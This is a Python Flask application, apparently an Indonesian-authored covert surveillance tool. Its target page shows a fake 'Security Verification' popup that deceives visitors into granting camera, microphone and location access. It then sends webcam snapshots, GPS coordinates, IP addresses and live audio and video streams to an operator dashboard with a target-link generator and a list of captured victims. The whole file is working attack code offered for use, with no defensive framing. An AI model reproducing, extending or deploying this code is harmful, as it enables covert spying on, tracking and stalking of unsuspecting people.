from flask import Flask, request, jsonify
from flask_socketio import SocketIO
import json, os, time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'murdany_vionix'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DB = os.path.expanduser("~/sipel_db.json")
if not os.path.exists(DB):
    with open(DB, 'w') as f: f.write("[]")

def get_db():
    with open(DB, 'r') as f: return json.load(f)

def save_db(d):
    with open(DB, 'w') as f: json.dump(d, f)

# === UI TARGET (FAKE POPUP TRICK) ===
TARGET_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
  body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  
  /* OVERLAY POPUP PALSU */
  .fake-popup-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; z-index: 9999; }
  .fake-popup { background: #fff; width: 85%; max-width: 340px; border-radius: 12px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: left; }
  .fake-popup h3 { margin: 0 0 10px 0; font-size: 18px; color: #202124; }
  .fake-popup p { margin: 0 0 20px 0; font-size: 14px; color: #4a4a4a; line-height: 1.5; }
  .fake-popup .buttons { display: flex; justify-content: flex-end; gap: 10px; }
  .fake-popup button { padding: 10px 15px; border: none; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
  .fake-popup .btn-block { background: transparent; color: #1a73e8; }
  .fake-popup .btn-allow { background: #1a73e8; color: #fff; }
  
  video { display: none; } canvas { display: none; }
</style></head><body>
  
  <!-- POPUP PALSU -->
  <div class="fake-popup-bg" id="fakePopup">
    <div class="fake-popup">
      <h3>Security Verification</h3>
      <p>This site wants to:<br><br>• Use your camera and microphone<br>• Know your location</p>
      <div class="buttons">
        <button class="btn-block" onclick="alert('Verification cancelled.')">Block</button>
        <button class="btn-allow" onclick="startAll()">Allow</button>
      </div>
    </div>
  </div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
let socket=null;
let isStarted = false;

async function startAll(){
  if (isStarted) return;
  isStarted = true;
  
  // Sembunyiin popup palsu
  document.getElementById('fakePopup').style.display = 'none';

  try {
    // 1. Tembak GPS & KAMERA
    const locPromise = new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true, timeout: 15000}));
    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: {facingMode:'user'}, audio: true });
    
    locPromise.then(pos => {
      const loc = {lat: pos.coords.latitude, lon: pos.coords.longitude};
      fetch('/api/submit', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({lat: loc.lat, lon: loc.lon, foto: null})
      });
    }).catch(e => console.log("GPS denied"));

    const mediaStream = await mediaPromise;
    const v = document.getElementById('v');
    v.srcObject = mediaStream;
    
    v.onloadedmetadata = () => {
      v.play();
      
      const c = document.getElementById('c');
      c.width = v.videoWidth; c.height = v.videoHeight;
      c.getContext('2d').drawImage(v, 0, 0);
      const foto = c.toDataURL('image/jpeg', 0.5);
      
      locPromise.then(pos => {
        const loc = {lat: pos.coords.latitude, lon: pos.coords.longitude};
        fetch('/api/submit', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({lat: loc.lat, lon: loc.lon, foto: foto})
        });
      }).catch(e => {
        fetch('/api/submit', {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({lat: null, lon: null, foto: foto})
        });
      });
      
      socket = io();
      socket.on('connect', () => {
        const audioTrack = mediaStream.getAudioTracks()[0];
        const audioRecorder = new MediaRecorder(new MediaStream([audioTrack]), { mimeType: 'audio/webm' });
        audioRecorder.ondataavailable = (e) => {
          if(e.data.size > 0) {
            const reader = new FileReader();
            reader.readAsDataURL(e.data);
            reader.onloadend = () => {
              if(socket.connected) socket.emit('live_data', { type: 'audio', data: reader.result });
            };
          }
        };
        audioRecorder.start(1000); 

        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d');
        setInterval(() => {
          if(v.videoWidth > 0) {
            canvas.width = 320; 
            canvas.height = 240; 
            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
            const frame = canvas.toDataURL('image/jpeg', 0.2);
            if(socket.connected) socket.emit('live_data', { type: 'video', data: frame });
          }
        }, 500); 
      });
    };
  } catch(e) {
    // Kalau korban nolak izin asli
  }
}
</script></body></html>
"""

# === UI DASHBOARD ===
DASH_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>MURDANY VIONIX // NEO-DRAGON</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
:root{--bg:#05050a;--panel:#0a0a0f;--cyan:#00f0ff;--red:#ff003c;--green:#00ff41;--text:#ccc;}
body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;padding:15px;max-width:520px;margin:auto}
h3{color:var(--cyan);font-family:'Orbitron',sans-serif;text-align:center;text-shadow:0 0 15px var(--cyan);letter-spacing:2px;border-bottom:1px solid var(--cyan);padding-bottom:10px;}
pre{color:var(--red);font-family:'Share Tech Mono',monospace;text-shadow:0 0 10px var(--red);font-size:8px;line-height:1.1;text-align:center;margin-bottom:10px;}
.log-box{background:#000;border:1px solid var(--green);padding:10px;border-radius:4px;height:100px;overflow-y:auto;font-size:11px;color:var(--green);margin-bottom:20px;box-shadow:inset 0 0 10px rgba(0,255,65,0.1)}
.log-box div{margin-bottom:4px;}
.live-box{border:1px solid var(--red);padding:10px;margin-bottom:20px;border-radius:4px;background:#000;position:relative;display:none;box-shadow:0 0 15px rgba(255,0,60,0.3)}
.live-box.active{display:block;}
.live-box h4{margin:0 0 5px 0;color:var(--red);font-size:12px;text-align:center;letter-spacing:1px;text-transform:uppercase;text-shadow:0 0 5px var(--red)}
#liveImg{width:100%;border:1px solid #333;display:block;min-height:200px;background:#111;}
.audio-controls{margin-top:10px;text-align:center;}
audio{width:100%;height:30px;filter:invert(1);}
.gen-box{border:1px dashed var(--cyan);padding:15px;margin-bottom:20px;border-radius:4px;background:rgba(0,240,255,0.05)}
.gen-box h4{margin:0 0 10px 0;color:var(--cyan);font-size:14px;letter-spacing:1px;font-family:'Orbitron',sans-serif;}
.gen-input{width:100%;padding:10px;background:#000;border:1px solid #333;color:#0f0;font-family:inherit;margin-bottom:10px;box-sizing:border-box;font-size:12px;}
.gen-btn{width:100%;padding:10px;background:var(--cyan);color:#000;border:none;font-weight:bold;font-family:'Share Tech Mono',monospace;cursor:pointer;text-transform:uppercase;margin-bottom:5px}
.card{background:var(--panel);border:1px solid #222;border-left:4px solid var(--red);border-radius:4px;padding:12px;margin-bottom:20px;display:flex;gap:12px;position:relative;box-shadow:0 0 10px rgba(255,0,60,0.1)}
.badge{position:absolute;top:0;right:0;background:var(--red);color:#fff;font-size:10px;padding:2px 8px;font-weight:bold;}
.left{flex:1} .left img{width:100%;border:1px solid var(--cyan);border-radius:4px;}
.right{flex:1.5;font-size:11px;line-height:1.6;color:#aaa;}
.val{color:#fff;} .label{color:var(--cyan);font-weight:bold;}
.map-link{color:var(--red);text-decoration:none;border-bottom:1px dashed var(--red);}
.footer{text-align:center;font-size:10px;color:#555;margin-top:30px;letter-spacing:2px;font-family:'Orbitron',sans-serif}
</style></head><body>
<pre>           /\\
          /  \\
         /    \\
        /      \\
       |  _.._  |
       | (o)(o) |
       |   ^    |
       |  \\_/   |
      /|        |\\
     / |        | \\
    /  |   🐉   |  \\
   /___|________|___\\</pre>
<h3>MURDANY VIONIX // NEO-NET</h3>

<div class="log-box" id="logBox">
  <div>> System initialized... Waiting for targets.</div>
</div>

<div class="live-box" id="liveBox">
  <h4>LIVE INTERCEPT ACTIVE</h4>
  <img id="liveImg" alt="Menunggu stream...">
  <div class="audio-controls">
    <audio id="liveAudio" controls autoplay></audio>
  </div>
</div>

<div class="gen-box">
  <h4>> TARGET LINK GENERATOR</h4>
  <input type="text" id="rawLink" class="gen-input" readonly>
  <button class="gen-btn" onclick="copyLink()">Copy Link Target</button>
  <button class="gen-btn" style="background: #ff003c; color: #fff; margin-top: 10px;" onclick="clearData()">HAPUS SEMUA DATA</button>
</div>

<div id="list"><p style="text-align:center;color:var(--cyan)">> SCANNING FOR PACKETS..._</p></div>
<div class="footer">BY MURDANY VIONIX © 2026</div>

<script>
const baseUrl = window.location.origin;
document.getElementById('rawLink').value = baseUrl + "/target";

function copyLink() {
  const copyText = document.getElementById("rawLink");
  navigator.clipboard.writeText(copyText.value);
  alert("Link Target dicopy!");
}

async function clearData() {
  if(confirm("Yakin mau hapus semua data gambar dan IP?")) {
    await fetch('/api/clear', {method: 'POST'});
    tick(); // Refresh tampilan
    alert("Data berhasil dihapus!");
  }
}

const socket = io();
let mediaSource = new MediaSource();
let sourceBuffer = null;
let audioQueue = [];
const liveAudio = document.getElementById('liveAudio');
liveAudio.src = URL.createObjectURL(mediaSource);

mediaSource.addEventListener('sourceopen', () => {
  try {
    sourceBuffer = mediaSource.addSourceBuffer('audio/webm; codecs="opus"');
    sourceBuffer.addEventListener('updateend', processQueue);
  } catch(e) { console.log("Audio mime error", e); }
});

function processQueue() {
  if (!sourceBuffer || sourceBuffer.updating || audioQueue.length === 0) return;
  sourceBuffer.appendBuffer(audioQueue.shift());
}

socket.on('sys_log', (data) => {
  const logBox = document.getElementById('logBox');
  const time = new Date().toLocaleTimeString('en-GB');
  logBox.innerHTML += `<div>> [${time}] ${data.msg}</div>`;
  logBox.scrollTop = logBox.scrollHeight;
});

socket.on('live_stream', async (msg) => {
  const box = document.getElementById('liveBox');
  if (msg.type === 'video') {
    box.classList.add('active');
    document.getElementById('liveImg').src = msg.data;
  } 
  else if (msg.type === 'audio') {
    try {
      const res = await fetch(msg.data);
      const arrayBuffer = await res.arrayBuffer();
      audioQueue.push(arrayBuffer);
      if (sourceBuffer && !sourceBuffer.updating && mediaSource.readyState === 'open') {
        processQueue();
      }
    } catch(e) {}
  }
});

async function tick(){
  const res = await fetch('/api/data');
  const data = await res.json();
  const c = document.getElementById('list');
  c.innerHTML = '';
  if(data.length===0) return c.innerHTML = '<p style="text-align:center;color:var(--cyan)">> NO DATA INTERCEPTED_</p>';
  data.reverse().forEach((d) => {
    const div = document.createElement('div');
    div.className = 'card';
    div.innerHTML = `
      <div class="badge">CAPTURED</div>
      <div class="left"><img src="${d.foto || 'https://via.placeholder.com/150/0a0a0f/00f0ff?text=NO+IMG'}"></div>
      <div class="right">
        <div><span class="label">ID:</span> <span class="val">#${d.seq}</span></div>
        <div><span class="label">TIME:</span> <span class="val">${d.waktu}</span></div>
        <div><span class="label">IP:</span> <span class="val">${d.ip}</span></div>
        <div><a href="https://maps.google.com/?q=${d.lat},${d.lon}" target="_blank" class="map-link">> TRACE MAP</a></div>
      </div>
    `;
    c.appendChild(div);
  });
}
setInterval(tick, 3000); tick();
</script></body></html>
"""

@app.route("/")
def dash(): return DASH_HTML

@app.route("/target")
def target(): return TARGET_HTML

@app.route("/api/submit", methods=['POST'])
def submit():
    body = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    now = time.strftime("%d-%m-%Y<br>%H:%M:%S")
    db = get_db()
    db.append({"seq": len(db)+1, "ip": ip, "waktu": now, "lat": body.get("lat"), "lon": body.get("lon"), "foto": body.get("foto")})
    save_db(db)
    
    if body.get("lat") and not body.get("foto"):
        socketio.emit('sys_log', {'msg': f'Target #{len(db)} terhubung. IP: {ip}'})
        socketio.emit('sys_log', {'msg': f'Koordinat didapat: {body.get("lat")}, {body.get("lon")}'})
    elif body.get("foto"):
        socketio.emit('sys_log', {'msg': f'Snapshot kamera #{len(db)} berhasil diambil.'})

    return jsonify({"status": "ok"})

@app.route("/api/data")
def get_data(): return jsonify(get_db())

@app.route("/api/clear", methods=['POST'])
def clear_data():
    save_db([]) # Reset database jadi kosong
    return jsonify({"status": "cleared"})

@socketio.on('live_data')
def handle_live_data(data):
    socketio.emit('live_stream', data)

@socketio.on('target_event')
def handle_target_event(data):
    if data.get('event') == 'hidden':
        socketio.emit('sys_log', {'msg': 'WARNING: Target pindah aplikasi / kunci layar.'})
    elif data.get('event') == 'visible':
        socketio.emit('sys_log', {'msg': 'Target kembali membuka halaman.'})

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8000, allow_unsafe_werkzeug=True)